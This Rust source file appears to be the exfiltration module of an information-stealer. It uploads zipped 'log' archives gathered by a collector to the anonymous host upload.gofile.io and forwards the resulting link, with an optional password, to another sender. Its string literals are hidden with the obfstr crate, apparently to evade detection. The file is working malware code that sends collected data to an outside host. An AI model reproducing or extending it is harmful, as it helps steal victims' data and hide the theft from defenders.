use crate::{LogContent, LogSender, SendError};
use alloc::string::String;
use alloc::vec::Vec;
use collector::Collector;
use derive_new::new;
use json::parse;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};

/// Gofile uploader wrapper around an inner [`LogSender`].
///
/// If the log is a zipped archive ([`LogContent::ZipArchive`]), this struct uploads it to
/// Gofile and then invokes the inner sender with [`LogContent::ExternalLink`].
#[derive(new, Clone)]
pub struct Gofile<T: LogSender> {
    inner: T
}

fn upload(name: &str, bytes: Vec<u8>) -> Option<String> {
    let mut builder = MultipartBuilder::new("----Multipart");
    builder.write_file_field(s!("file"), name, s!("application/zip"), &bytes);

    let content_type = builder.content_type();
    let body = builder.finish();

    let response = Request::post(s!("https://upload.gofile.io/uploadFile"))
        .header(s!("Content-Type"), &content_type)
        .body(body)
        .build()
        .send()
        .ok()?;

    Some(
        parse(response.body())
            .ok()
            ?.get(s!("data"))
            ?.get(s!("downloadPage"))
            ?.as_string()
            ?.clone()
    )
}

impl<T: LogSender> LogSender for Gofile<T> {
    fn send<P, C>(&self, log_file: LogContent, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector
    {
        match log_file {
            LogContent::ExternalLink(_) => self.inner.send(log_file, password, collector),
            LogContent::ZipArchive(archive) => {
                let size = archive.len();
                let link = upload(s!("log.zip"), archive)
                    .ok_or(SendError::Network)?;

                self.inner.send(LogContent::ExternalLink((link, size)), password, collector)
            }
        }
    }
}
